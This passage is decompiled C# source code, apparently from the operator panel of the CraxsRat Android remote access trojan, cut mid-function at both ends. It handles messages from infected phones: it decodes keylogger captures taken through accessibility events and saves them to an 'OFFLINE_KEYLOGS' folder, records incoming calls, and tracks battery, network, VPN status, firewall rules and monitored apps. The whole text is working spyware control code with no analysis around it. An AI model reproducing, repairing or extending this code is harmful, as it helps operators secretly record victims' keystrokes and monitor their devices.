										//	_0024VB_0024ResumableLocal_autoer_0024100.DrawPoint(new object[4] { _0024VB_0024ResumableLocal_x_0024103, _0024VB_0024ResumableLocal_y_0024104, _0024VB_0024ResumableLocal_w_0024105, _0024VB_0024ResumableLocal_h_0024106 });
										}
										else if (_0024VB_0024ResumableLocal_THEDATA_0024101.StartsWith("[L]"))
										{
											_0024VB_0024ResumableLocal_Arrynames_0024107 = _0024VB_0024ResumableLocal_THEDATA_0024101.Replace("[L]", "").Split(',');
										//	_0024VB_0024ResumableLocal_autoer_0024100.AddRecords(new object[1] { _0024VB_0024ResumableLocal_Arrynames_0024107 });
										}
										else
										{
											_0024VB_0024ResumableLocal_msg_0024108 = _0024VB_0024ResumableLocal_THEDATA_0024101;
											//_0024VB_0024ResumableLocal_autoer_0024100.UpdateStatus(new object[1] { _0024VB_0024ResumableLocal_msg_0024108 });
										}
									}
								}
								catch (Exception ex33)
								{
									ProjectData.SetProjectError(ex33);
									Exception ex34 = ex33;
									_0024VB_0024ResumableLocal_ex_0024109 = ex34;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "-5", TextCompare: false) == 0)
							{
								try
								{
									if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row != null)
									{
										_0024VB_0024ResumableLocal_THEDATA_0024110 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										_0024S111 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CALLS.Count() - 1;
										_0024VB_0024ResumableLocal_index_0024112 = 1;
										while (_0024VB_0024ResumableLocal_index_0024112 <= _0024S111)
										{
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CALLS[_0024VB_0024ResumableLocal_index_0024112] != null)
											{
												_0024VB_0024ResumableLocal_index_0024112++;
												continue;
											}
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.CALLS[_0024VB_0024ResumableLocal_index_0024112] = reso.CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhqws(_0024VB_0024ResumableLocal_THEDATA_0024110, _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
											MainForm.updaterows(new object[2]
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient,
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row
											});
											break;
										}
										_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isnewcall = true;
									}
								}
								catch (Exception ex35)
								{
									ProjectData.SetProjectError(ex35);
									Exception ex36 = ex35;
									_0024VB_0024ResumableLocal_ex_0024113 = ex36;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "-666", TextCompare: false) == 0)
							{
								try
								{
									if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row != null)
									{
										_0024VB_0024ResumableLocal_THEDATA_0024114 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										reso.FormatNotifi(_0024VB_0024ResumableLocal_THEDATA_0024114, _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient);
										MainForm.updaterows(new object[2]
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient,
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row
										});
									}
								}
								catch (Exception ex37)
								{
									ProjectData.SetProjectError(ex37);
									Exception ex38 = ex37;
									_0024VB_0024ResumableLocal_ex_0024115 = ex38;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "825", TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal_SPLall_0024116 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
									_0024VB_0024ResumableLocal_SPL_0024117 = "";
									_0024VB_0024ResumableLocal_filename_0024118 = "null";
									if (_0024VB_0024ResumableLocal_SPLall_0024116.Contains("|"))
									{
										_0024VB_0024ResumableLocal_SPL_0024117 = _0024VB_0024ResumableLocal_SPLall_0024116.Split('|')[1];
										_0024VB_0024ResumableLocal_filename_0024118 = _0024VB_0024ResumableLocal_SPLall_0024116.Split('|')[0];
									}
									else
										_0024VB_0024ResumableLocal_SPL_0024117 = _0024VB_0024ResumableLocal_SPLall_0024116;
									_0024VB_0024ResumableLocal_handle_0024119 = "Keylogger_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
									_0024VB_0024ResumableLocal_keylogg_0024120 = (Keylogger)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024119];
									if (_0024VB_0024ResumableLocal_keylogg_0024120 != null)
									{
										_0024VB_0024ResumableLocal_base64log_0024121 = _0024VB_0024ResumableLocal_SPL_0024117.Split('>');
										if (_0024VB_0024ResumableLocal_base64log_0024121.Length > 0)
										{
											_0024VB_0024ResumableLocal_Alltext_0024122 = "";
											_0024S123 = _0024VB_0024ResumableLocal_base64log_0024121;
											for (_0024S124 = 0; _0024S124 < _0024S123.Length; _0024S124++)
											{
												_0024VB_0024ResumableLocal_log_0024125 = _0024S123[_0024S124];
												try
												{
													_0024VB_0024ResumableLocal_rsult_0024126 = Codes.BSDE(_0024VB_0024ResumableLocal_log_0024125);
													_0024VB_0024ResumableLocal_dat_0024127 = _0024VB_0024ResumableLocal_rsult_0024126.Split('#');
													if (Operators.CompareString(_0024VB_0024ResumableLocal_dat_0024127[1], "[]", TextCompare: false) != 0)
														_0024VB_0024ResumableLocal_Alltext_0024122 = _0024VB_0024ResumableLocal_Alltext_0024122 + Codes.AccessibilityEvent(Conversions.ToInteger(_0024VB_0024ResumableLocal_dat_0024127[2])) + _0024VB_0024ResumableLocal_dat_0024127[0] + _0024VB_0024ResumableLocal_dat_0024127[1] + "\r\n- - - - - - - - -\r\n";
												}
												catch (Exception ex39)
												{
													ProjectData.SetProjectError(ex39);
													Exception ex40 = ex39;
													_0024VB_0024ResumableLocal_ex_0024128 = ex40;
													ProjectData.ClearProjectError();
												}
											}
											if (!Directory.Exists(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS"))
												Directory.CreateDirectory(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS");
											if (Operators.CompareString(_0024VB_0024ResumableLocal_filename_0024118, "null", TextCompare: false) == 0)
											{
												if (_0024VB_0024ResumableLocal_SPLall_0024116.Contains("|"))
												{
													_0024VB_0024ResumableLocal_d_0024129 = DateTime.Now.ToString("yyyy-MM-dd HH-mm-ss");
													File.WriteAllText(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS\\" + _0024VB_0024ResumableLocal_d_0024129 + ".txt", _0024VB_0024ResumableLocal_Alltext_0024122);
												}
												else
													File.WriteAllText(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS\\" + _0024VB_0024ResumableLocal_keylogg_0024120.combologs.Text + ".txt", _0024VB_0024ResumableLocal_Alltext_0024122);
											}
											else
												File.WriteAllText(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS\\" + _0024VB_0024ResumableLocal_filename_0024118, _0024VB_0024ResumableLocal_Alltext_0024122);
										}
									}
								}
								catch (Exception ex41)
								{
									ProjectData.SetProjectError(ex41);
									Exception ex42 = ex41;
									_0024VB_0024ResumableLocal_ex_0024130 = ex42;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "888", TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal_SPL_0024131 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
									_0024VB_0024ResumableLocal_handle_0024132 = "Keylogger_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
									_0024VB_0024ResumableLocal_keylogg_0024133 = (Keylogger)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024132];
									if (_0024VB_0024ResumableLocal_keylogg_0024133 != null)
									{
										_0024VB_0024ResumableLocal_base64log_0024134 = _0024VB_0024ResumableLocal_SPL_0024131.Split('>');
										_0024VB_0024ResumableLocal_keylogg_0024133.cleait();
										_0024VB_0024ResumableLocal_smalnum_0024135 = 0;
										if (_0024VB_0024ResumableLocal_base64log_0024134.Length > 0)
										{
											_0024VB_0024ResumableLocal_Alltext_0024136 = "";
											try
											{
												_0024VB_0024ResumableLocal_offlinetext_0024137 = new StringBuilder();
												_0024VB_0024ResumableLocal_prevustext_0024138 = "";
												_0024S139 = _0024VB_0024ResumableLocal_base64log_0024134;
												for (_0024S140 = 0; _0024S140 < _0024S139.Length; _0024S140++)
												{
													_0024VB_0024ResumableLocal_log_0024141 = _0024S139[_0024S140];
													try
													{
														_0024VB_0024ResumableLocal_rsult_0024142 = Codes.BSDE(_0024VB_0024ResumableLocal_log_0024141);
														_0024VB_0024ResumableLocal_dat_0024143 = _0024VB_0024ResumableLocal_rsult_0024142.Split('#');
														if (Operators.CompareString(_0024VB_0024ResumableLocal_dat_0024143[1], "[]", TextCompare: false) != 0 && Operators.CompareString(_0024VB_0024ResumableLocal_prevustext_0024138, _0024VB_0024ResumableLocal_dat_0024143[1], TextCompare: false) != 0)
														{
															_0024VB_0024ResumableLocal_prevustext_0024138 = _0024VB_0024ResumableLocal_dat_0024143[1];
															_0024VB_0024ResumableLocal_offlinetext_0024137.Append("\r\n\r\n" + Codes.AccessibilityEvent(Conversions.ToInteger(_0024VB_0024ResumableLocal_dat_0024143[2])) + " -> " + _0024VB_0024ResumableLocal_dat_0024143[0] + " -> " + _0024VB_0024ResumableLocal_dat_0024143[1]);
														}
													}
													catch (Exception ex43)
													{
														ProjectData.SetProjectError(ex43);
														Exception ex44 = ex43;
														_0024VB_0024ResumableLocal_ex_0024144 = ex44;
														ProjectData.ClearProjectError();
													}
												}
												_0024VB_0024ResumableLocal_Alltext_0024136 = _0024VB_0024ResumableLocal_offlinetext_0024137.ToString();
												if (!string.IsNullOrEmpty(_0024VB_0024ResumableLocal_Alltext_0024136))
													_0024VB_0024ResumableLocal_keylogg_0024133.Done(new object[1] { _0024VB_0024ResumableLocal_Alltext_0024136 });
											}
											catch (Exception ex45)
											{
												ProjectData.SetProjectError(ex45);
												Exception ex46 = ex45;
												_0024VB_0024ResumableLocal_ex_0024145 = ex46;
												ProjectData.ClearProjectError();
											}
											try
											{
												if (Operators.CompareString(SpySettings.SAVING_DATA, "Yes", TextCompare: false) == 0 && _0024VB_0024ResumableLocal_Alltext_0024136.Length > 0)
												{
													if (!Directory.Exists(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS"))
														Directory.CreateDirectory(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS");
													File.WriteAllText(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\OFFLINE_KEYLOGS\\" + _0024VB_0024ResumableLocal_keylogg_0024133.combologs.Text + ".txt", _0024VB_0024ResumableLocal_Alltext_0024136);
												}
											}
											catch (Exception ex47)
											{
												ProjectData.SetProjectError(ex47);
												Exception ex48 = ex47;
												_0024VB_0024ResumableLocal_ex_0024146 = ex48;
												ProjectData.ClearProjectError();
											}
										}
									}
								}
								catch (Exception ex49)
								{
									ProjectData.SetProjectError(ex49);
									Exception ex50 = ex49;
									_0024VB_0024ResumableLocal_ex_0024147 = ex50;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, SecurityKey.getUpdate, TextCompare: false) == 0)
							{
								try
								{
									if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Row != null)
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148 = new _Closure_0024__39_002D7(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148);
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024Local_SPL = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
										_0024VB_0024ResumableLocal_TargetRow_0024149 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Row;
										try
										{
											MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024Local_SPL[1], 48, 48, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient);
											}));
										}
										catch (Exception ex51)
										{
											ProjectData.SetProjectError(ex51);
											Exception ex52 = ex51;
											_0024VB_0024ResumableLocal_ex_0024150 = ex52;
											ProjectData.ClearProjectError();
										}
										try
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Screen = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024Local_SPL[2];
										}
										catch (Exception ex53)
										{
											ProjectData.SetProjectError(ex53);
											Exception ex54 = ex53;
											_0024VB_0024ResumableLocal_ex_0024151 = ex54;
											ProjectData.ClearProjectError();
										}
										try
										{
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024Local_SPL[3] != null)
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.BatteryCharge = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024Local_SPL[3];
												if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.BatteryCharge.EndsWith("t"))
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.BatteryCharge = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.BatteryCharge.Replace("t", "").Replace("f", "");
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Battery = "-1";
												}
												else
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Battery = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.BatteryCharge;
											}
											else
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.BatteryCharge = "Unkown";
										}
										catch (Exception ex55)
										{
											ProjectData.SetProjectError(ex55);
											Exception ex56 = ex55;
											_0024VB_0024ResumableLocal_ex_0024152 = ex56;
											ProjectData.ClearProjectError();
										}
										MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											try
											{
												if ((object)_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024Local_SPL[4] != "-1")
												{
													string left3 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024Local_SPL[4];
													if (Operators.CompareString(left3, "1", TextCompare: false) != 0)
													{
														if (Operators.CompareString(left3, "0", TextCompare: false) != 0)
															_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
														else
															_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
													}
													else
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
												}
												else
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
											}
											catch (Exception projectError2)
											{
												ProjectData.SetProjectError(projectError2);
												ProjectData.ClearProjectError();
											}
											try
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
											}
											catch (Exception projectError3)
											{
												ProjectData.SetProjectError(projectError3);
												ProjectData.ClearProjectError();
											}
										}));
										MainForm.updaterows(new object[2]
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient,
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024148._0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Row
										});
									}
								}
								catch (Exception ex57)
								{
									ProjectData.SetProjectError(ex57);
									Exception ex58 = ex57;
									_0024VB_0024ResumableLocal_ex_0024153 = ex58;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "9090", TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal_THEDATA_0024154 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
									if (_0024VB_0024ResumableLocal_THEDATA_0024154.Contains("!"))
									{
										_0024VB_0024ResumableLocal_arrystr_0024155 = _0024VB_0024ResumableLocal_THEDATA_0024154.Split('!');
										if (_0024VB_0024ResumableLocal_arrystr_0024155[0].ToString().ToLower().Equals("False".ToLower()))
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsonVPN = false;
										else if (_0024VB_0024ResumableLocal_arrystr_0024155[0].ToString().ToLower().Equals("True".ToLower()))
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.IsonVPN = true;
										}
										if (_0024VB_0024ResumableLocal_arrystr_0024155[1].Contains(">"))
										{
											_0024VB_0024ResumableLocal_apps_0024156 = _0024VB_0024ResumableLocal_arrystr_0024155[1].Split('>');
											MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Rows.Count > 0)
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Rows.Clear();
											}));
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Columns.Count == 0)
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Columns.Add(" ", typeof(Image));
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Columns.Add("App");
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Columns.Add("State");
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Columns.Add("ID");
											}
											_0024S157 = _0024VB_0024ResumableLocal_apps_0024156;
											for (_0024S158 = 0; _0024S158 < _0024S157.Length; _0024S158++)
											{
												_0024VB_0024ResumableLocal_app_0024159 = _0024S157[_0024S158];
												if (_0024VB_0024ResumableLocal_app_0024159.Contains(":"))
												{
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160 = new _Closure_0024__39_002D8(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160);
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024NonLocal__0024VB_0024Closure_7 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo = _0024VB_0024ResumableLocal_app_0024159.Split(':');
													MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
													{
														if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo[0], "B", TextCompare: false) != 0)
															_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(Codes.Base64ToImage(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo[3]), _0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo[2], "Allowed", _0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo[1]);
														else
															_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(Codes.Base64ToImage(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo[3]), _0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo[2], "Blocked", _0024VB_0024ResumableLocal__0024VB_0024Closure__0024160._0024VB_0024Local_appinfo[1]);
													}));
												}
											}
										}
									}
									else if (_0024VB_0024ResumableLocal_THEDATA_0024154.Contains("#"))
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024161 = new _Closure_0024__39_002D9(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024161);
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024161._0024VB_0024Local_arrystr = _0024VB_0024ResumableLocal_THEDATA_0024154.Split('#');
										try
										{
											_0024S162 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Rows.GetEnumerator();
											while (_0024S162.MoveNext())
											{
												_0024VB_0024ResumableLocal_row_0024163 = (DataRow)_0024S162.Current;
												try
												{
													_0024S164 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FirewallTable.Columns.GetEnumerator();
													while (_0024S164.MoveNext())
													{
														_0024VB_0024ResumableLocal_cell_0024165 = (DataColumn)_0024S164.Current;
														_0024VB_0024ResumableLocal_cellValue_0024166 = _0024VB_0024ResumableLocal_row_0024163[3].ToString();
														if (Operators.CompareString(_0024VB_0024ResumableLocal_cellValue_0024166, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024161._0024VB_0024Local_arrystr[0], TextCompare: false) == 0)
														{
															_0024VB_0024ResumableLocal_row_0024163[2] = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024161._0024VB_0024Local_arrystr[2];
															MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
															{
																CraxsAlert.ShowSucess(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024161._0024VB_0024Local_arrystr[1] + " has been: " + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024161._0024VB_0024Local_arrystr[2]);
															}));
															break;
														}
													}
												}
												finally
												{
													if (num < 0 && _0024S164 is IDisposable)
														(_0024S164 as IDisposable).Dispose();
												}
											}
										}
										finally
										{
											if (num < 0 && _0024S162 is IDisposable)
												(_0024S162 as IDisposable).Dispose();
										}
									}
								}
								catch (Exception ex59)
								{
									ProjectData.SetProjectError(ex59);
									Exception ex60 = ex59;
									_0024VB_0024ResumableLocal_ex_0024167 = ex60;
									ProjectData.ClearProjectError();
								}
							}
							else if (Operators.CompareString(_0024S9, "0099", TextCompare: false) == 0)
							{
								_0024VB_0024ResumableLocal_THEDATA_0024168 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
								if (_0024VB_0024ResumableLocal_THEDATA_0024168.Contains("!"))
								{
									_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169 = new _Closure_0024__39_002D13(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169);
									_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240;
									_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024Local_arry2 = _0024VB_0024ResumableLocal_THEDATA_0024168.Split('!');
									if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024Local_arry2[0], "L", TextCompare: false) == 0)
									{
										_0024VB_0024ResumableLocal_arryapps_0024170 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024Local_arry2[1].Split('>');
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedDatesFounded != null && _0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedDatesFounded.Length > 0)
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedDatesFounded = null;
										MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Count > 0)
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Clear();
											if (MainForm.combodatestrack.Items != null && MainForm.combodatestrack.Items.Count > 0)
											{
												MainForm.combodatestrack.Items.Clear();
												MainForm.combodatestrack.Text = "";
											}
										}));
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Columns.Count == 0)
										{
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Columns.Add(" ", typeof(Image));
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Columns.Add("App");
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Columns.Add("Has Records");
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Columns.Add("ID");
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Columns.Add("records");
										}
										_0024S171 = _0024VB_0024ResumableLocal_arryapps_0024170;
										for (_0024S172 = 0; _0024S172 < _0024S171.Length; _0024S172++)
										{
											_0024VB_0024ResumableLocal_str_0024173 = _0024S171[_0024S172];
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024174 = new _Closure_0024__39_002D11(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024174);
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024174._0024VB_0024NonLocal__0024VB_0024Closure_9 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024169;
											_0024VB_0024ResumableLocal__0024VB_0024Closure__0024174._0024VB_0024Local_HasRecords = "No";
											if (_0024VB_0024ResumableLocal_str_0024173.Contains(":"))
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175 = new _Closure_0024__39_002D10(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175);
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024NonLocal__0024VB_0024Closure_10 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024174;
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_collect = _0024VB_0024ResumableLocal_str_0024173.Split(':');
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_Appname = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_collect[1];
